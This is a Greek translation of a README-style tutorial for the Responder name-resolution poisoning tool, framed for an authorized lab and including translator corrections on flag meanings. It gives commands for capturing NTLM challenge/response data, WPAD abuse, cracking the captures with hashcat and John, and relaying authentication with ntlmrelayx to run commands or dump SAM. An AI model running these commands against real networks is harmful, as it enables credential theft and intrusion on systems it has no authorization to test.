# 🎣 Responder — Έλεγχοι παραποίησης επίλυσης ονομάτων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Έλεγχοι παραποίησης επίλυσης ονομάτων LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## Πριν ξεκινήσετε

Το **Responder** μιμείται υπηρεσίες επίλυσης ονομάτων και αυθεντικοποίησης σε ένα δίκτυο. Αν ένας client ανταποκριθεί, μπορεί να καταγραφεί ανταλλαγή **NTLM challenge/response**. Αυτό διαφέρει από το αποθηκευμένο **NT hash** ενός κωδικού και δεν δίνει αυτόματα πρόσβαση σε άλλες υπηρεσίες.

**Βασικοί όροι:** *poisoning* = παραποίηση αποκρίσεων, *interface* = διεπαφή δικτύου, *challenge* = πρόκληση του server, *response* = υπολογισμένη απάντηση του client, *WPAD* = αυτόματη ανακάλυψη ρυθμίσεων proxy, *relay* = ζωντανή αναμετάδοση αυθεντικοποίησης. Η επίλυση DNS, LLMNR, NBT-NS και mDNS δεν ακολουθεί την ίδια ακριβώς διαδικασία σε κάθε σύστημα.

Τα παραδείγματα αφορούν εγκεκριμένο εργαστήριο και μπορούν να επηρεάσουν την κίνηση δικτύου. Οι εντολές διατηρούνται από το πρωτότυπο και δεν εκτελούνται κατά τη μετάφραση. Διακρίνετε τη λειτουργία παρατήρησης από ενεργές αποκρίσεις.

## 📋 Περιεχόμενα

- [Τι είναι το Responder](#section-01)
- [Εγκατάσταση](#section-02)
- [Βασική χρήση](#section-03)
- [Καταγραφή αποκρίσεων αυθεντικοποίησης NTLMv2](#section-04)
- [Αναμετάδοση αυθεντικοποίησης (relay)](#section-05)
- [Υπηρεσίες που μιμούνται νόμιμους servers](#section-06)
- [Ρυθμίσεις](#section-07)
- [Γρήγορη αναφορά](#section-08)
- [Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Responder

**Το Responder** απαντά σε ερωτήματα επίλυσης ονομάτων και μπορεί να προκαλέσει αυθεντικοποίηση προς δικές του υπηρεσίες. Καταγράφει στοιχεία ανταλλαγής NTLM, όχι απλώς το αποθηκευμένο NT hash του κωδικού:

- 🎣 **Παραποίηση LLMNR** — αλλαγή αποκρίσεων τοπικής επίλυσης ονομάτων μέσω multicast
- 📡 **Παραποίηση NBT-NS** — αποκρίσεις υπηρεσίας ονομάτων NetBIOS
- 🍎 **Παραποίηση mDNS** — αποκρίσεις DNS μέσω multicast
- 🔓 **Καταγραφή ανταλλαγής αυθεντικοποίησης** — δεδομένα challenge/response NTLMv1 ή NTLMv2
- 🔄 **Συνδυασμός με relay** — αναμετάδοση αυθεντικοποίησης με ξεχωριστό εργαλείο

### Πώς λειτουργεί

```
1. Ο χρήστης γράφει λανθασμένο όνομα: \\fileservr
2. Η επίλυση μέσω DNS αποτυγχάνει
3. Όπου είναι ενεργό, ακολουθεί ερώτημα LLMNR/NBT-NS
4. Το Responder δηλώνει ότι αντιστοιχεί στο ζητούμενο όνομα
5. Ο client μπορεί να αρχίσει αυθεντικοποίηση NTLM προς αυτή την υπηρεσία
6. Καταγράφεται η ανταλλαγή challenge/response· relay απαιτεί ζωντανή αναμετάδοση
```

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

### Kali Linux

```bash
# Προεγκατεστημένο όπου περιλαμβάνεται στη διανομή
responder --help

# Ενημέρωση
sudo apt update && sudo apt install responder

# Εναλλακτικά από GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Επαλήθευση εγκατάστασης

```bash
responder --help
responder -I eth0 --version
```

---

<a id="section-03"></a>

## 💻 Βασική χρήση

### Εκκίνηση του Responder

```bash
# Βασική καταγραφή ανταλλαγών αυθεντικοποίησης
sudo responder -I eth0

# Αναλυτική έξοδος
sudo responder -I eth0 -v

# Λειτουργία παρατήρησης χωρίς τις συνήθεις αποκρίσεις παραποίησης
sudo responder -I eth0 -A
```

### Επιλογή διεπαφής δικτύου

```bash
# Ενσύρματη διεπαφή Ethernet
sudo responder -I eth0

# Ασύρματες επικοινωνίες
sudo responder -I wlan0

# Προβολή διεπαφών δικτύου
ip a
```

---

<a id="section-04"></a>

## 🔓 Καταγραφή αποκρίσεων αυθεντικοποίησης NTLMv2

### Βασική καταγραφή

```bash
# Εκκίνηση Responder
sudo responder -I eth0

# Αναμονή σχετικής κίνησης του εγκεκριμένου εργαστηρίου
# Ενδεικτική έξοδος:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Παράδειγμα με --lm: απαιτείται διόρθωση περιγραφής

> **Λανθασμένη περιγραφή στο πρωτότυπο:** Το --lm αφορά υποβάθμιση προς LM, όχι επιβολή NTLMv2. Μην χρησιμοποιήσετε την εντολή ως παράδειγμα «NTLMv2 only». Δείτε την [επίσημη υλοποίηση επιλογών Responder](https://github.com/lgandx/Responder/blob/master/Responder.py).


```bash
# Λανθασμένη περιγραφή πρωτοτύπου: το --lm ζητά υποβάθμιση LM, όχι NTLMv2
sudo responder -I eth0 --lm
```

### Καταγραφή μέσω WPAD

```bash
# Ενεργοποίηση υπηρεσίας proxy WPAD
sudo responder -I eth0 -w

# Απαίτηση αυθεντικοποίησης κατά την πρόσβαση στο WPAD
sudo responder -I eth0 -wF
```

### Θέσεις αρχείων καταγραφής

```bash
# Τα δεδομένα αυθεντικοποίησης αποθηκεύονται σε:
/usr/share/responder/logs/
# Εναλλακτικά
./logs/

# Αρχεία:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Έλεγχος υποψήφιων κωδικών στις καταγραφές

```bash
# Ενδεικτική μορφή καταγραφής NetNTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat με κωδικό λειτουργίας 5600
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

<a id="section-05"></a>

## 🔄 Αναμετάδοση αυθεντικοποίησης (relay)

> **Καταγραφή και relay διαφέρουν:** Η αποθηκευμένη απόκριση NetNTLM δεν χρησιμοποιείται αυτούσια σαν NT hash. Το relay απαιτεί ζωντανή ανταλλαγή και επιτρεπόμενη αυθεντικοποίηση στον προορισμό. SMB signing, προστασία καναλιού και δικαιώματα αλλάζουν το αποτέλεσμα. Επιλογές ntlmrelayx όπως --sam χρειάζονται έλεγχο στη δική σας έκδοση· δείτε το [επίσημο Impacket](https://github.com/fortra/impacket).


### Απενεργοποίηση SMB/HTTP για το παράδειγμα relay

```bash
# Επεξεργασία Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Ρυθμίστε:
SMB = Off
HTTP = Off
```

### Συνδυασμός Responder και ntlmrelayx

```bash
# Πρώτο τερματικό: Responder με τις αντίστοιχες υπηρεσίες απενεργοποιημένες
sudo responder -I eth0

# Δεύτερο τερματικό: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Εναλλακτικό παράδειγμα με εκτέλεση εντολής
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Αναμετάδοση προς LDAP

```bash
# Responder
sudo responder -I eth0

# Αναμετάδοση αυθεντικοποίησης προς LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Παράδειγμα εξαγωγής SAM μέσω relay

```bash
# Παράδειγμα εξαγωγής SAM· ελέγξτε συμβατότητα επιλογών
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="section-06"></a>

## 🖥️ Υπηρεσίες που μιμούνται νόμιμους servers

### Ενσωματωμένοι servers

| Server — εξυπηρετητής | Θύρα | Σκοπός |
| -------- | ------ | --------- |
| SMB | 445 | Αυθεντικοποίηση υπηρεσίας διαμοιρασμού αρχείων |
| HTTP | 80 | Αυθεντικοποίηση web |
| HTTPS | 443 | Web μέσω TLS |
| FTP | 21 | Αυθεντικοποίηση FTP |
| SQL | 1433 | Αυθεντικοποίηση Microsoft SQL Server |
| LDAP | 389 | Αυθεντικοποίηση υπηρεσίας καταλόγου |
| WPAD | 80 | Διαμόρφωση proxy |

### Ενεργοποίηση και απενεργοποίηση servers

```bash
# Επεξεργασία Responder.conf
[Responder Core]
; Υπηρεσίες που θα εκκινηθούν
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Proxy που διαφημίζεται μέσω WPAD

> **Αυθεντικοποίηση WPAD:** Το -F ζητά αυθεντικοποίηση για το WPAD και δεν επιλέγει από μόνο του αποκλειστικά HTTP Basic. Η επιλογή --wpad-name του παραδείγματος χρειάζεται έλεγχο συμβατότητας. Τα πεδία και οι διακόπτες επιβεβαιώνονται από τη βοήθεια της εγκατεστημένης έκδοσης.


```bash
# Ενεργοποίηση WPAD
sudo responder -I eth0 -w

# Απαίτηση αυθεντικοποίησης WPAD· το -F δεν επιλέγει μόνο του Basic
sudo responder -I eth0 -wF

# Παράδειγμα προσαρμοσμένου WPAD· ελέγξτε αν υποστηρίζεται η επιλογή
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### Παραποίηση απαντήσεων DNS (DNS Spoofing)

> **Διαφορετική επιλογή:** Το -d αφορά DHCP και δεν είναι γενικός διακόπτης DNS server. Το DNS του configuration είναι ξεχωριστή ρύθμιση. Οι αρχικές περιγραφές χρειάζονται αυτή τη διόρθωση· επιβεβαιώστε την εγκατεστημένη έκδοση.


```bash
# Το -d του παραδείγματος αφορά DHCP, όχι γενική ενεργοποίηση DNS
sudo responder -I eth0 -d

# Περιγραφή του πρωτοτύπου· το -d δεν είναι γενικός διακόπτης DNS server
# Περιγραφή του πρωτοτύπου· οι αποκρίσεις εξαρτώνται από ρυθμίσεις και λειτουργία
```

---

<a id="section-07"></a>

## ⚙️ Ρυθμίσεις

> **Στιγμιότυπο ρυθμίσεων:** Ονόματα ενοτήτων και κλειδιά του πρωτοτύπου μπορεί να διαφέρουν από το παρεχόμενο αρχείο της έκδοσής σας. Ένα σταθερό challenge δεν εγγυάται γενική αξιοποίηση προϋπολογισμένων πινάκων για κάθε τύπο NTLM. Οι διαδρομές logs εξαρτώνται από τον τρόπο εγκατάστασης.


### Responder.conf

```bash
# Τοποθεσία
/usr/share/responder/Responder.conf
# Εναλλακτικά
./Responder.conf
```

### Βασικές ρυθμίσεις

```ini
[Responder Core]
; Επιλογή τιμής On ή Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Επιλογή challenge κατά το πρωτότυπο, σχετική με προϋπολογισμένους πίνακες
Challenge = Random

; Περιγραφή ρύθμισης του πρωτοτύπου· ελέγξτε τιμές και ενότητα configuration
DontRespondTo =

; Περιορισμός αποκρίσεων στις συγκεκριμένες IP
RespondTo =
```

### Σταθερή πρόκληση για προϋπολογισμένους πίνακες

```ini
; Σταθερό challenge για το παράδειγμα προϋπολογισμένων πινάκων
Challenge = 1122334455667788
```

### Εξαιρέσεις

```ini
; Αποκλεισμός αποκρίσεων προς αυτές τις IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; Περιορισμός αποκρίσεων στις συγκεκριμένες διευθύνσεις
RespondTo = 192.168.1.100, 192.168.1.101
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `responder -I eth0` | Βασική καταγραφή |
| `responder -I eth0 -v` | Αναλυτική καταγραφή πληροφοριών |
| `responder -I eth0 -A` | Μόνο παρατήρηση μέσω analyze |
| `responder -I eth0 -w` | Ενεργοποίηση WPAD |
| `responder -I eth0 -wF` | Απαίτηση αυθεντικοποίησης WPAD |
| `responder -I eth0 -d` | Περιγραφή πρωτοτύπου: το -d αφορά DHCP |

### Επιλογές γραμμής εντολών

| Σημαία | Περιγραφή |
| ------ | ------------- |
| `-I` | Διεπαφή δικτύου |
| `-v` | Αναλυτική έξοδος |
| `-A` | Λειτουργία παρατήρησης (analyze) |
| `-w` | Ενεργοποίηση WPAD |
| `-wF` | Απαίτηση αυθεντικοποίησης WPAD |
| `-d` | Περιγραφή πρωτοτύπου: το -d αφορά DHCP |
| `-f` | Αναγνώριση ενδείξεων ταυτότητας υπολογιστών |
| `-b` | Απόκριση με HTTP Basic authentication |

### Τύποι hashes

| Τύπος | Κωδικός λειτουργίας Hashcat | Μορφή δεδομένων John |
| ------ | -------------- | ------------- |
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Ακολουθία ελέγχου

```bash
# 1. Εκκίνηση Responder
sudo responder -I eth0 -wFv

# 2. Αναμονή καταγραφών αυθεντικοποίησης
# Αποθήκευση καταγραφών στο ./logs/

# 3. Δοκιμή υποψήφιων κωδικών στις καταγραφές
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Εναλλακτικό παράδειγμα relay· απαιτεί κατάλληλη απενεργοποίηση υπηρεσιών
sudo responder -I eth0  # SMB=Off στο αρχείο ρυθμίσεων
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Ακολουθία ελέγχου relay

```bash
# 1. Συλλογή ενδείξεων για στόχους που δεν απαιτούν SMB signing
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Ρύθμιση του Responder.conf
# SMB = Off
# HTTP = Off

# 3. Εκκίνηση Responder
sudo responder -I eth0

# 4. Εκκίνηση εργαλείου αναμετάδοσης
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Αναμονή αναμεταδιδόμενης αυθεντικοποίησης
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [Πηγαίος κώδικας Responder](https://github.com/lgandx/Responder)
- [Ανάλυση αναμετάδοσης NTLM και παραποίησης επίλυσης ονομάτων](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Σχετικοί οδηγοί
- [Impacket](../../Impacket/translations/README.el.md)
- [CrackMapExec](../../CrackMapExec/translations/README.el.md)
- [Hashcat](../../Hashcat/translations/README.el.md)

---

<p align="center">
  <b>🎣 Μελετήστε τις ανταλλαγές αυθεντικοποίησης δικτύου!</b><br>
  <i>Responder — κατανόηση επίλυσης ονομάτων και NTLM</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
